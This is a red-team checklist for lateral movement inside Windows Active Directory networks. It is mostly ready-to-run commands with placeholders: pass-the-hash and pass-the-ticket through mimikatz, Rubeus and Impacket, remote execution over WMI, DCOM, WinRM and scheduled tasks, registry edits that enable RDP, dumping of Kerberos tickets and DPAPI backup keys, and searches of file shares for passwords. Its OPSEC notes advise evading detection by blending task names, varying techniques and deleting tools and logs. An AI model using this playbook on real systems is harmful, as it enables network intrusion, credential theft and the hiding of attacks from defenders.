# Lateral Movement Checklist

## Pass-the-Hash (PtH)

- [ ] PtH via CrackMapExec: `crackmapexec smb <target> -u <user> -H <ntlm> -x <command>`
- [ ] PtH via Impacket psexec: `psexec.py -hashes <lm:nt> <domain>/<user>@<target>`
- [ ] PtH via Impacket wmiexec: `wmiexec.py -hashes <lm:nt> <domain>/<user>@<target>`
- [ ] PtH via Impacket smbexec: `smbexec.py -hashes <lm:nt> <domain>/<user>@<target>`
- [ ] PtH via Impacket atexec: `atexec.py -hashes <lm:nt> <domain>/<user>@<target>` — Uses Task Scheduler
- [ ] PtH via mimikatz: `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe`
- [ ] **OPSEC**: PtH against 2008/Win7+ with KB2871997 blocks local admin PtH by default; check target OS
- [ ] **OPSEC**: PtH uses NTLM auth, which can be logged as 4624 (logon with type 3)

## Overpass-the-Hash (OPtH)

- [ ] OPtH with mimikatz (NTLM → TGT): `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe`
- [ ] OPtH with Rubeus: `Rubeus asktgt /user:<user> /rc4:<ntlm> /domain:<domain> /ptt`
- [ ] Get TGT via NTLM hash: `Rubeus asktgt /user:<user> /rc4:<hash> /domain:<domain> /ptt /nowrap`
- [ ] Get TGT via AES key: `Rubeus asktgt /user:<user> /aes256:<aes-key> /domain:<domain> /ptt`
- [ ] Verify injected ticket: `klist`
- [ ] Access target with injected TGT: `dir \\<target>\c$`
- [ ] **OPSEC**: OPtH generates TGT request (event 4768) — less suspicious than NTLM auth for old systems
- [ ] **OPSEC**: Removes NTLM reliance; better for modern patched systems

## Pass-the-Ticket (PtT)

- [ ] Export tickets: `mimikatz sekurlsa::tickets /export` — Dumps all Kerberos tickets from LSASS
- [ ] Inject ticket into current session: `mimikatz kerberos::ptt <ticket.kirbi>`
- [ ] PtT with Rubeus: `Rubeus ptt /ticket:<base64-ticket>` or `Rubeus ptt /ticket:ticket.kirbi`
- [ ] List cached tickets: `klist`
- [ ] Use ticket for access: `dir \\<target>\c$` — Uses Kerberos auth
- [ ] Convert ticket formats: `kirbi2ccache.py <ticket.kirbi> > ticket.ccache` — For Impacket tools
- [ ] Use converted ticket: `export KRB5CCNAME=ticket.ccache && smbexec.py -k <domain>/<user>@<target>`
- [ ] **OPSEC**: PtT uses Kerberos — less signatured than NTLM-based movement
- [ ] **OPSEC**: Stolen TGTs have expiration; TGS tickets are service-specific

## PsExec (Impacket)

- [ ] Standard PsExec: `psexec.py <domain>/<user>:<pass>@<target>`
- [ ] PsExec with hash: `psexec.py -hashes <lm:nt> <domain>/<user>@<target>`
- [ ] PsExec with Kerberos: `psexec.py -k <domain>/<user>@<target>`
- [ ] Write command output to file: `psexec.py <domain>/<user>:<pass>@<target> <cmd>`
- [ ] Sysinternals psexec native: `PsExec.exe \\<target> -u <domain>\<user> -p <pass> cmd.exe`
- [ ] **OPSEC**: PsExec creates PSEXESVC service (named pipe and service) — very signatured
- [ ] **OPSEC**: Service creation is event 7045 on target; named pipe events also logged

## WMI

- [ ] WMI exec (Impacket): `wmiexec.py <domain>/<user>:<pass>@<target>`
- [ ] WMI hash auth: `wmiexec.py -hashes <lm:nt> <domain>/<user>@<target>`
- [ ] WMI via native PS: `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "<cmd>" -ComputerName <target>`
- [ ] WMI via CIM (WinRM): `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="<cmd>"} -ComputerName <target>`
- [ ] WMI query: `wmic /node:<target> /user:<user> /password:<pass> process call create "<cmd>"`
- [ ] **OPSEC**: WMI uses DCOM (port 135) — often allowed through firewalls
- [ ] **OPSEC**: WMI is quieter than PsExec but still generates process creation events (4688)

## SMB / File Shares

- [ ] Enumerate accessible shares: `crackmapexec smb <target> -u <user> -p <pass> --shares`
- [ ] Mount share: `net use Z: \\<target>\<share> /user:<domain>\<user> <pass>`
- [ ] Search for interesting files on shares: `Find-InterestingFile -Path "\\<target>\<share>" -InterestingFiles @("*.txt", "*.xml", "*.csv", "*.xls*", "*.doc*", "*.kdbx", "*pass*")`
- [ ] SMBMap full enumeration: `smbmap -u <user> -p <pass> -d <domain> -H <target> -R` — Recursive listing
- [ ] Look for KeePass DBs: `*.kdbx` — Often found on file shares
- [ ] Look for scripts with creds: `*.ps1`, `*.bat`, `*.vbs`, `*.cmd` with inline passwords
- [ ] Look for Excel/Word docs with creds: `.xls`, `.xlsm`, `.doc`, `.docm` with password lists
- [ ] **OPSEC**: File share enumeration is normal in AD; low risk

## WinRM

- [ ] Test WinRM availability: `crackmapexec winrm <target> -u <user> -p <pass>` — Check if WinRM enabled
- [ ] WinRM via Evil-WinRM: `evil-winrm -i <target> -u <user> -p <pass>`
- [ ] WinRM with hash: `evil-winrm -i <target> -u <user> -H <hash>`
- [ ] WinRM via native PS remoting: `Enter-PSSession -ComputerName <target> -Credential <cred>`
- [ ] WinRM via PowerShell: `Invoke-Command -ComputerName <target> -ScriptBlock { <cmd> }`
- [ ] **OPSEC**: WinRM is HTTP/HTTPS (5985/5986) — common and widely allowed
- [ ] **OPSEC**: PowerShell remoting is logged with event IDs 400, 403, 600, 4100+ on target

## Scheduled Tasks

- [ ] Create remote task via Impacket: `atexec.py <domain>/<user>:<pass>@<target> <cmd>`
- [ ] Create task with hash: `atexec.py -hashes <lm:nt> <domain>/<user>@<target> <cmd>`
- [ ] Create scheduled task natively: `schtasks /CREATE /S <target> /U <domain>\<user> /P <pass> /SC ONCE /ST 00:00 /TN "TaskName" /TR "<cmd>" /RU SYSTEM`
- [ ] Run task: `schtasks /RUN /S <target> /TN "TaskName"`
- [ ] Delete task: `schtasks /DELETE /S <target> /TN "TaskName" /F`
- [ ] **OPSEC**: Task creation events (4698) and task run events (4699) are logged on target
- [ ] **OPSEC**: Use unique task names that blend with existing naming patterns

## Remote Desktop (RDP)

- [ ] Check if RDP is available: `crackmapexec rdp <target> -u <user> -p <pass>`
- [ ] RDP with hash: Use `xfreerdp` or `restricted admin mode`: `xfreerdp /v:<target> /u:<user> /pth:<ntlm>`
- [ ] Enable RDP if disabled: `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
- [ ] Enable restricted admin: `reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f`
- [ ] Add user to RDP group: `net localgroup "Remote Desktop Users" <domain>\<user> /add`
- [ ] **OPSEC**: RDP logon events (4624 with logon type 10) are logged; multiple concurrent RDP sessions from unusual users are flagged
- [ ] **OPSEC**: Restricted Admin mode (PtH over RDP) works on Win8/2012+

## DPAPI Over Network

- [ ] Use domain backup key: `mimikatz dpapi::masterkey /in:<mk-file> /pvk:<pvk-file> /rpc`
- [ ] Decrypt machine-level DPAPI: Requires SYSTEM context
- [ ] Domain DPAPI backup key dump: `mimikatz lsadump::backupkeys /system:<dc-ip>`
- [ ] **OPSEC**: DPAPI RPC calls are low noise; useful for decrypting user data remotely

## DCOM

- [ ] DCOM via MMC20: `$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<target>")); $com.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c <cmd>", "7")`
- [ ] DCOM via Excel: `$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("00024500-0000-0000-C000-000000000046", "<target>")); $com.Application.DisplayAlerts = $false; $com.Application.Run(<macro>)`
- [ ] DCOM via ShellWindows: `$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", "<target>"))`
- [ ] **OPSEC**: DCOM is often monitored by EDR for lateral movement; use sparingly

## SSH / SCP (if available)

- [ ] SSH via Plink: `plink.exe <user>@<target> -pw <pass> <cmd>`
- [ ] SSH key forwarding: Use compromised SSH keys in `%USERPROFILE%\.ssh\`
- [ ] SCP file transfer: `scp <user>@<target>:<file> <dest>`
- [ ] **OPSEC**: SSH is common for Linux targets; not typical for pure Windows AD lateral movement

## Target Selection Strategy

- [ ] Prioritize targets by user sessions: `crackmapexec smb <target-list> -u <user> -H <hash> --sessions`
- [ ] Find targets with high-value users logged in: `crackmapexec smb <target-list> -u <user> -H <hash> --loggedon-users`
- [ ] Prioritize file servers: High density of interesting data and user sessions
- [ ] Prioritize developers' workstations: Often high privileges, source code access, service accounts
- [ ] Prioritize admins' workstations: Direct access to DA credentials
- [ ] Check local admin access: `crackmapexec smb <subnet> -u <user> -H <hash> --local-auth` — Local admin to many boxes = pivot fast
- [ ] **OPSEC**: Pre-authenticated session enumeration (--sessions) generates network traffic to each target

## Lateral Movement Flow

1. Get a **foothold user hash** (from credential access phase)
2. **Enumerate local admin** access with PtH across subnet: `crackmapexec smb <subnet>/24 -u <user> -H <hash>`
3. On targets where user is local admin: **drop C2 beacon**, run **Mimikatz**, capture new creds
4. Harvest new users and hashes; repeat step 2 with each new user
5. Target **Session collection** (logged-on users) to find Domain Admin sessions
6. When a DA session is found: **PtH/DCSync** to escalate to domain dominance

## OPSEC Summary

| Technique | Noise Level | Detection Risk | Notes |
|---|---|---|---|
| PtH | Medium | Medium | NTLM logon (4624) on target |
| OPtH | Low | Low-Medium | TGT request, good for modern |
| PtT | Low | Low | Kerberos only, stealthy |
| PsExec | High | High | PSEXESVC is well-known |
| WMI | Medium | Medium | DCOM, process creation |
| WinRM | Medium | Medium | PS remoting events |
| Scheduled Tasks | Medium | High | Tasks created = events |
| RDP | Medium | Medium | Type 10 logon visible |
| DCOM | High | High | Actively monitored by EDR |

## Connection Chain Tracking

- [ ] Note which user (hash) was used to which target
- [ ] Track C2 implant filenames to avoid duplicates
- [ ] Document all lateral movement paths for debrief
- [ ] Clean up tools after use: `del <tool> ; del <log>`
- [ ] Use different technique per target to avoid pattern detection
